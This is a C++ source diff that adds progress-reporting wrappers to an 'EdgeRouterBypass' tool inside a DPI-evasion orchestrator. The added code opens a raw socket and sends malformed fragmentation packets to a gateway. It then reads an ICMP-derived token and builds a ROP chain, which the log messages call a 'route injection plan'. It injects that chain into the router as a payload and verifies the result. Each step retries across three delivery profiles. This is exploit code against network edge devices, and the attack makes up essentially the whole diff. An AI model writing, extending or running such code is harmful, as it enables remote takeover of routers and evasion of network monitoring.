@@ -1353,6 +1353,66 @@ bool DpiEvasionOrchestrator::attemptEdgeRouterBypass(
     }
 }
 
+bool DpiEvasionOrchestrator::attemptEdgeRouterBypassWithProgress(
+    const std::string& target_mac, 
+    const std::string& exit_ip,
+    const std::string& iface,
+    std::function<bool(const std::string&)> progress_cb) {
+    
+    std::lock_guard<std::mutex> lock(state_mutex_);
+    edge_bypass_active_ = false;
+    edge_bypass_status_ = "RUNNING: executing delivery and verification sequence";
+    edge_bypass_log_.clear();
+    
+    // Initial progress update
+    if (!progress_cb("Initializing bypass parameters")) return false;
+    
+    EdgeRouterBypass::BypassConfig config;
+    config.target_mac = target_mac;
+    config.exit_ip = exit_ip;
+    config.iface = iface;
+    config.verbose = true;
+    
+    EdgeRouterBypass bypass(config);
+    
+    if (!progress_cb("Creating raw socket")) return false;
+    
+    std::cout << "\n[*] Initializing Edge Router DPI Bypass...\n";
+    std::cout << "    Parameters loaded from in-app discovery\n\n";
+    
+    // Execute with progress tracking
+    const bool ok = bypass.executeWithProgress([&progress_cb](const std::string& step) {
+        return progress_cb(step);
+    });
+    
+    edge_bypass_log_ = bypass.getExecutionLog();
+    if (ok) {
+        edge_bypass_active_ = true;
+        edge_bypass_status_ = bypass.getStatus();
+        
+        if (!progress_cb("Bypass established successfully")) return false;
+        
+        // Log execution details
+        for (const auto& entry : edge_bypass_log_) {
+            std::cout << "    " << entry << "\n";
+        }
+        
+        std::cout << "\n[SUCCESS] Edge Router bypass established!\n";
+        return true;
+    } else {
+        edge_bypass_active_ = false;
+        edge_bypass_status_ = "FAILED: " + bypass.getStatus();
+        
+        if (!progress_cb("Bypass failed: " + bypass.getStatus())) return false;
+        
+        for (const auto& entry : edge_bypass_log_) {
+            std::cout << "    " << entry << "\n";
+        }
+        std::cout << "[ERROR] Edge Router bypass failed: " << bypass.getStatus() << "\n";
+        return false;
+    }
+}
+
 std::string DpiEvasionOrchestrator::getEdgeRouterBypassStatus() const {
     std::lock_guard<std::mutex> lock(state_mutex_);
     if (edge_bypass_active_.load()) {
@@ -1462,6 +1522,104 @@ bool EdgeRouterBypass::execute() {
         
     } catch (const std::exception& e) {
         status_ = "Exception: " + std::string(e.what());
+        return false;
+    }
+}
+
+bool EdgeRouterBypass::executeWithProgress(std::function<bool(const std::string&)> progress_cb) {
+    try {
+        if (!progress_cb("Starting edge-router bypass execution")) return false;
+        log("[PLAN] Starting edge-router bypass execution");
+        log("[PLAN] gateway_mac=" + config_.target_mac + " exit_ip=" + config_.exit_ip + " iface=" + config_.iface);
+#ifdef _WIN32
+        log("[PLAN] platform=windows raw_socket=icmp");
+#else
+        log("[PLAN] platform=linux raw_socket=af_packet");
+#endif
+        
+        if (!progress_cb("Initializing raw socket")) return false;
+        status_ = "Initializing raw socket";
+        if (!initRawSocket()) {
+            status_ = "Failed to initialize raw socket";
+            progress_cb("Failed to initialize raw socket");
+            return false;
+        }
+        log("[STEP 1/5] Raw socket initialized on " + config_.iface);
+
+        struct DeliveryPlan {
+            const char* fragmentation_profile;
+            const char* payload_mode;
+        };
+        const DeliveryPlan delivery_plans[] = {
+            {"gateway_icmp_seed", "exit_only_host_route"},
+            {"gateway_icmp_seed_with_dns_targets", "exit_plus_dns_host_routes"},
+            {"gateway_icmp_seed_with_expanded_targets", "expanded_host_route_mesh"}
+        };
+
+        for (int i = 0; i < static_cast<int>(sizeof(delivery_plans) / sizeof(delivery_plans[0])); ++i) {
+            const DeliveryPlan& plan = delivery_plans[i];
+            const std::string step_msg = "Delivery attempt " + std::to_string(i + 1) + "/" +
+                std::to_string(static_cast<int>(sizeof(delivery_plans) / sizeof(delivery_plans[0]))) +
+                " fragment=" + plan.fragmentation_profile +
+                " payload=" + plan.payload_mode;
+            
+            if (!progress_cb(step_msg)) return false;
+            log("[STEP 2/5] " + step_msg);
+
+            if (!progress_cb("Sending fragmentation anomaly")) return false;
+            status_ = "Sending fragmentation anomaly";
+            if (!sendFragmentationAnomaly(plan.fragmentation_profile)) {
+                log("[WARN] Delivery attempt " + std::to_string(i + 1) + " could not send fragmentation anomaly");
+                continue;
+            }
+            log("[STEP 3/5] Fragmentation anomaly sent");
+
+            if (!progress_cb("Collecting route baseline")) return false;
+            status_ = "Collecting route baseline";
+            uint64_t route_baseline_token = 0;
+            if (!analyzeIcmpResponse(route_baseline_token)) {
+                log("[WARN] Delivery attempt " + std::to_string(i + 1) + " did not produce usable route baseline evidence");
+                continue;
+            }
+            log("[STEP 4/5] Route baseline token 0x" + utils::toHex(route_baseline_token));
+
+            if (!progress_cb("Building route injection plan")) return false;
+            status_ = "Building route injection plan";
+            std::vector<uint8_t> rop_chain;
+            if (!constructRopChain(rop_chain)) {
+                status_ = "Failed to build route injection plan";
+                progress_cb("Failed to build route injection plan");
+                return false;
+            }
+            log("[*] Route injection plan prepared (" + std::to_string(rop_chain.size()) + " bytes)");
+
+            if (!progress_cb("Applying route injection plan")) return false;
+            status_ = "Applying route injection plan";
+            if (!injectPayload(rop_chain, plan.payload_mode)) {
+                log("[WARN] Delivery attempt " + std::to_string(i + 1) + " route injection failed");
+                continue;
+            }
+            log("[+] Route injection plan applied");
+
+            if (!progress_cb("Verifying route injection")) return false;
+            status_ = "Verifying route injection";
+            if (verifyRouteInjection()) {
+                const bool local_only = status_.find("LOCAL ROUTE EVIDENCE") != std::string::npos;
+                const std::string result_msg = std::string(local_only ? "[PARTIAL] " : "[SUCCESS] ") + status_ + " on delivery attempt " + std::to_string(i + 1);
+                log(result_msg);
+                progress_cb(result_msg);
+                return true;
+            }
+            log("[WARN] Verification probes failed on delivery attempt " + std::to_string(i + 1) + "; trying fallback delivery profile");
+        }
+
+        status_ = "Route injection verification failed across all delivery attempts";
+        progress_cb("All delivery attempts failed");
+        return false;
+        
+    } catch (const std::exception& e) {
+        status_ = "Exception: " + std::string(e.what());
+        progress_cb("Exception: " + std::string(e.what()));
         return false;
     }
 }
